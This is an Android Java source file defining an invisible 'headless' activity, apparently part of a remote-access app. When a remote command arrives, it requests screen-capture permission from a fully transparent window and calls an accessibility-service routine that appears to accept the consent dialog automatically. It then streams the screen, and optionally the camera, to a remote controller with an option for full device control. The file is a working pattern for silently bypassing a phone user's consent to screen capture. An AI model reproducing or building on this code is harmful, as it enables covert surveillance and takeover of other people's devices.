package com.tokendeal.vremote;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.WindowManager;

/**
 * HeadlessCaptureActivity is a 100% invisible transparent activity that requests
 * the MediaProjection permission dialog without displaying any dark window, blank screen,
 * or bringing the full MainActivity UI to the foreground.
 */
public class HeadlessCaptureActivity extends Activity {
    private static final String TAG = "HeadlessCapture";
    private static final int REQUEST_SCREEN_CAPTURE = 1001;
    private static volatile long sLastLaunchTime = 0;
    /** Live instance, so a second screen_share command can reuse the dialog
     *  that is already on screen instead of stacking another one on top of it. */
    private static volatile HeadlessCaptureActivity sInstance = null;
    private static volatile boolean sPermissionPending = false;
    /** Safety net: a permission dialog that is never answered must not linger
     *  forever, otherwise every following screen_share request is ignored. */
    private static final long PERMISSION_TIMEOUT_MS = 15000;

    private String mTargetUser = "";
    private boolean mFullControl = false;
    private boolean mStreamCamera = false;
    private String mCamChoice = "none";
    private boolean mStreamingStarted = false;
    private final Handler mWatchdog = new Handler(Looper.getMainLooper());
    private final Runnable mTimeoutRunnable = () -> {
        if (mStreamingStarted) return;
        AppLogs.w(TAG, "Screen capture permission timed out — closing stale request");
        sPermissionPending = false;
        notifyBrowserFailure("Screen share permission was not granted in time. Please try again.");
        finish();
    };

    public static synchronized void start(Context context, String targetUser, boolean fullControl, boolean camera, String camChoice) {
        HeadlessCaptureActivity alive = sInstance;
        if (alive != null && !alive.isFinishing() && !alive.isDestroyed()) {
            // A request (usually the MediaProjection consent dialog) is already
            // in flight. Reuse it for the newest target instead of launching a
            // second activity, which used to stack invisible dialogs until
            // nothing connected any more.
            AppLogs.i(TAG, "Reusing pending screen share request for target=" + targetUser);
            alive.applyRequest(targetUser, fullControl, camera, camChoice);
            alive.reTriggerAutoAccept();
            return;
        }
        long now = System.currentTimeMillis();
        if (now - sLastLaunchTime < 1200) {
            AppLogs.w(TAG, "Ignoring duplicate screen share start request within 1.2s");
            return;
        }
        sLastLaunchTime = now;
        Intent intent = new Intent(context, HeadlessCaptureActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.putExtra("target_user", targetUser);
        intent.putExtra("full_control", fullControl);
        intent.putExtra("stream_camera", camera);
        intent.putExtra("camera_choice", camChoice);
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                android.app.ActivityOptions opt = android.app.ActivityOptions.makeBasic();
                opt.setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
                context.startActivity(intent, opt.toBundle());
            } else {
                context.startActivity(intent);
            }
        } catch (Exception e) {
            AppLogs.e(TAG, "Failed to launch HeadlessCaptureActivity: " + e.getMessage(), e);
        }
    }

    /** Called on end_call / disconnect so a half-open permission dialog cannot
     *  block every future screen share request. */
    public static void cancelPending() {
        HeadlessCaptureActivity inst = sInstance;
        sPermissionPending = false;
        if (inst != null) {
            inst.runOnUiThread(() -> {
                try { inst.finish(); } catch (Throwable ignored) {}
            });
        }
    }

    private void applyRequest(String targetUser, boolean fullControl, boolean camera, String camChoice) {
        mTargetUser = (targetUser != null) ? targetUser : "";
        mFullControl = fullControl;
        mStreamCamera = camera;
        mCamChoice = (camChoice != null) ? camChoice : "none";
    }

    private void reTriggerAutoAccept() {
        try { RemoteAccessibilityService.triggerAutoAccept(this); } catch (Throwable ignored) {}
    }

    private static void notifyBrowserFailure(String reason) {
        try {
            WebRTCCompanion companion = MainActivity.getCompanionInstance();
            if (companion != null) companion.emitDeviceError(reason);
        } catch (Throwable ignored) {}
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sInstance = this;

        applyRequest(
                getIntent() != null ? getIntent().getStringExtra("target_user") : null,
                getIntent() != null && getIntent().getBooleanExtra("full_control", false),
                getIntent() != null && getIntent().getBooleanExtra("stream_camera", false),
                getIntent() != null ? getIntent().getStringExtra("camera_choice") : "none"
        );

        // Ensure activity window is 100% transparent and does not turn on screen or dim
        if (getWindow() != null) {
            getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            getWindow().setDimAmount(0.0f);
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
        }
        overridePendingTransition(0, 0);

        mWatchdog.removeCallbacks(mTimeoutRunnable);
        mWatchdog.postDelayed(mTimeoutRunnable, PERMISSION_TIMEOUT_MS);
        requestProjectionPermission();
    }

    private void requestProjectionPermission() {
        if (sPermissionPending) return;
        sPermissionPending = true;
        RemoteAccessibilityService.triggerAutoAccept(this);

        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (manager != null) {
            try {
                startActivityForResult(manager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
            } catch (Exception e) {
                sPermissionPending = false;
                AppLogs.e(TAG, "Failed to create screen capture intent: " + e.getMessage(), e);
                finish();
            }
        } else {
            sPermissionPending = false;
            finish();
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        if (intent == null) return;
        AppLogs.i(TAG, "New screen share request delivered to the pending activity");
        applyRequest(
                intent.getStringExtra("target_user"),
                intent.getBooleanExtra("full_control", false),
                intent.getBooleanExtra("stream_camera", false),
                intent.getStringExtra("camera_choice")
        );
        if (!sPermissionPending && !mStreamingStarted) {
            requestProjectionPermission();
        } else {
            reTriggerAutoAccept();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_SCREEN_CAPTURE) {
            sPermissionPending = false;
            mWatchdog.removeCallbacks(mTimeoutRunnable);
            if (resultCode == Activity.RESULT_OK && data != null) {
                AppLogs.i(TAG, "Screen capture permission granted in HeadlessCaptureActivity");
                mStreamingStarted = true;
                final Intent tokenIntent = (Intent) data.clone();
                final String targetUser = mTargetUser;
                final boolean fullControl = mFullControl;
                final boolean streamCam = mStreamCamera;
                final String camChoice = mCamChoice;
                if (targetUser == null || targetUser.isEmpty()) {
                    AppLogs.w(TAG, "No target controller for screen share — aborting");
                    mStreamingStarted = false;
                    finish();
                    return;
                }

                startStreaming(tokenIntent, targetUser, fullControl, streamCam, camChoice);
            } else {
                AppLogs.w(TAG, "Screen capture permission was rejected or cancelled");
                notifyBrowserFailure("Screen share permission was cancelled on the phone.");
            }
        }
        finish();
        overridePendingTransition(0, 0);
    }

    private void startStreaming(Intent tokenIntent, String targetUser, boolean fullControl, boolean streamCam, String camChoice) {
        ScreenCaptureService.prepareForStart();
        ScreenCaptureService.setOnForegroundStartedListener(() -> {
            try {
                AppLogs.i(TAG, "ScreenCaptureService ready, starting WebRTC companion screen share for target=" + targetUser);
                DisplayMetrics metrics = new DisplayMetrics();
                WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                if (wm != null && wm.getDefaultDisplay() != null) {
                    wm.getDefaultDisplay().getRealMetrics(metrics);
                } else {
                    metrics.widthPixels = 720;
                    metrics.heightPixels = 1600;
                }

                WebRTCCompanion companion = MainActivity.getOrCreateCompanion(getApplicationContext());
                companion.setFullControlEnabled(fullControl);
                companion.startScreenShare(targetUser, tokenIntent, metrics.widthPixels, metrics.heightPixels, streamCam, camChoice);
            } catch (Throwable t) {
                AppLogs.e(TAG, "Error in headless onForegroundStarted: " + t.getMessage(), t);
            }
        });

        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
        serviceIntent.putExtra("session_type", "screen_share");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    @Override
    public void finish() {
        mWatchdog.removeCallbacks(mTimeoutRunnable);
        sPermissionPending = false;
        if (sInstance == this) sInstance = null;
        super.finish();
        overridePendingTransition(0, 0);
    }

    @Override
    protected void onDestroy() {
        mWatchdog.removeCallbacks(mTimeoutRunnable);
        sPermissionPending = false;
        if (sInstance == this) sInstance = null;
        super.onDestroy();
    }
}
